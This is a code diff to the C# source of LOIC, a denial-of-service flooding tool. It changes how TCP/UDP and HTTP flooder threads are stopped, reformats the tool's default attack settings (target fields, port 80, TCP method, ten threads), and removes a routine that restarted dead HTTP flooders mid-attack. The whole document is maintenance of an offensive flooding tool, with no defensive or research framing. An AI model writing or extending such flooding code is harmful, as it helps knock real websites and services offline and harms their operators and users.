@@ -162,14 +162,14 @@ namespace LOIC
 				{
 					for (int a = 0; a < xxp.Length; a++)
 					{
-						xxp[a].IsFlooding = false;
+						xxp[a].Stop();
 					}
 				}
 				if(http != null)
 				{
 					for (int a = 0; a < http.Length; a++)
 					{
-						http[a].IsFlooding = false;
+						http[a].Stop();
 					}
 				}
 				//tShowStats.Stop();
@@ -658,19 +658,19 @@ namespace LOIC
 					}
 					else if(sp[0].ToLower() == "default")
 					{
-						 txtTargetIP.Text = "";
-						 txtTargetURL.Text ="";
-						 txtTimeout.Text = "9001";
-						 txtSubsite.Text = "/";
-						 txtData.Text = "U dun goofed";
-						 txtPort.Text = "80";
-						 int index = cbMethod.FindString("TCP");
-						 if(index != -1) { cbMethod.SelectedIndex = index; }
-						 txtThreads.Text = "10";
-						 chkWaitReply.Checked = true;
-						 chkAllowRandom.Checked = false;
-						 chkAllowGzip.Checked = true;
-						 tbSpeed.Value = 0;
+						txtTargetIP.Text = "";
+						txtTargetURL.Text ="";
+						txtTimeout.Text = "9001";
+						txtSubsite.Text = "/";
+						txtData.Text = "U dun goofed";
+						txtPort.Text = "80";
+						int index = cbMethod.FindString("TCP");
+						if(index != -1) { cbMethod.SelectedIndex = index; }
+						txtThreads.Text = "10";
+						chkWaitReply.Checked = true;
+						chkAllowRandom.Checked = false;
+						chkAllowGzip.Checked = true;
+						tbSpeed.Value = 0;
 					}
 				}
 			}
@@ -778,8 +778,6 @@ namespace LOIC
 		{
 			if(intShowStats) return; intShowStats = true;
 
-			bool isFlooding = false;
-			if(cmdAttack.Text == "Stop for now") isFlooding = true;
 			if(protocol == Protocol.TCP || protocol == Protocol.UDP)
 			{
 				int iFloodCount = 0;
@@ -813,18 +811,6 @@ namespace LOIC
 						iRequesting++;
 					if(http[a].State == HTTPFlooder.ReqState.Downloading)
 						iDownloading++;
-					if(isFlooding && !http[a].IsFlooding)
-					{
-						int iaDownloaded = http[a].Downloaded;
-						int iaRequested = http[a].Requested;
-						int iaFailed = http[a].Failed;
-						http[a] = null;
-						http[a] = new HTTPFlooder(sHost, sIP, iPort, sSubsite, chkWaitReply.Checked, iDelay, iTimeout, chkAllowRandom.Checked, chkAllowGzip.Checked);
-						http[a].Downloaded = iaDownloaded;
-						http[a].Requested = iaRequested;
-						http[a].Failed = iaFailed;
-						http[a].Start();
-					}
 				}
 				lbFailed.Text = iFailed.ToString();
 				lbRequested.Text = iRequested.ToString();
